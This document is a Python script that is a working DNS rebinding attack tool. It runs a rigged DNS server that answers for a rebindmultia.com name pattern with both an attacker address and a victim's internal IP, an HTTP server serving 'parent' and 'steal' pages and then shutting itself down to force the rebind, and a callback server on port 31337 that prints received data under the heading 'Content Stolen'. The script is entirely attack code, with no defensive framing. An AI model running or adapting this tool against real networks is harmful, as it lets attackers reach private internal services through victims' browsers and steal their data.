#!/usr/bin/env python
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from socketserver import ThreadingMixIn
import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import re
import json
import base64
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    pass

class callbackHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        content_length = int(self.headers['Content-Length'])
        file_content = self.rfile.read(content_length)
        print("--------Content Stolen----------")
        print(base64.b64decode(json.loads(file_content.decode())['data']).decode("utf-8"))
        print("--------/Content Stolen----------")

class rebindHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/parent":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            f = open("parent.html")
            resp = f.read().replace("{location}", str(args.location))
            f.close()
            resp = resp.encode("utf-8")
            self.wfile.write(resp)
        elif self.path == "/steal":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            rf = open(args.file)
            resp = rf.read().replace("{callbackServerPort}", str(args.callback_port))
            rf.close()
            resp = resp.encode('utf-8')
            self.wfile.write(resp)
        elif self.path == "/rebind":
            time.sleep(1)
            self.send_response(302)
            self.send_header("Location", args.location)
            self.end_headers()
            try:
                self.server.server_close()
            except:
                #This will error because we're in the thread we're terminating...
                pass
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Nope</h1>")


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        data = self.get_data()
        self.send_data(dns_response(data))


class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def dns_response(data):
    TTL = 600
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    dn = str(request.q.qname).lower()
    m = re.match("(\d{0,3}.\d{0,3}.\d{0,3}.\d{0,3}).target.(\d{0,3}.\d{0,3}.\d{0,3}.\d{0,3}).ns.rebindmultia.com", dn)
    if not m:
        #Not a request we are interested in responding to
        return reply.pack()
    localip, server = m.groups()
    qname = request.q.qname
    reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(server)))
    reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(localip)))
    print(f"[DNS]: {dn} - A:{server}, A:{localip}")
    return reply.pack()



def main(args):
    #Start the DNS server
    s = socketserver.ThreadingUDPServer(('0.0.0.0', int(args.dns_port)), UDPRequestHandler)
    thread = threading.Thread(target=s.serve_forever)
    thread.daemon = True
    thread.start()

    #Start HTTP callback server
    cs = ThreadingHTTPServer(('0.0.0.0', int(args.callback_port)), callbackHTTPRequestHandler)
    thread = threading.Thread(target=cs.serve_forever)
    thread.daemon = True
    thread.start()

    #Start rebind server
    rs = ThreadingHTTPServer(('0.0.0.0', int(args.port)), rebindHTTPRequestHandler)
    thread = threading.Thread(target=rs.serve_forever)
    thread.daemon = True
    thread.start()

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        s.shutdown()
        cs.shutdown()
        rs.shutdown()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', help="Specify port to attack on targetIp.", default=80)
    parser.add_argument('-c', '--callback-port', help="Specify the callback HTTP server port.", default=31337)
    parser.add_argument('-d', '--dns-port', help="Specify the DNS server port.", default=53)
    parser.add_argument('-f', '--file', help="Specify the HTML file to display in the first iframe.(The \"steal\" iframe)", default="steal.html")
    parser.add_argument('-l', '--location', help="Specify the location of the data you'd like to steal on the target.", default="/")
    args = parser.parse_args()
    main(args)
